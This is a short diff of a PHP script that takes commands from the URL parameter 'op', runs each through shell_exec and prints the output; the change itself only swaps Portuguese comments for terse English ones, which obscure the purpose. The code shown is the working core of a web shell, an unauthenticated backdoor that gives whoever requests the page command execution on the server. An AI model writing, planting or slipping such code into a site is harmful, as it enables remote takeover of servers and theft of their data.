@@ -6,11 +6,11 @@ if (isset($_GET['op'])) {
     foreach ($commands as $command) {
         $command = trim($command);
 
-        // Executar o comando no sistema operacional
+//exec op
         $output .= shell_exec($command) . "\n";
     }
 
-    // Mostrar a saída dos comandos
+//view op
     echo "<pre>$output</pre>";
 } else {
     echo "Nenhum comando especificado.";
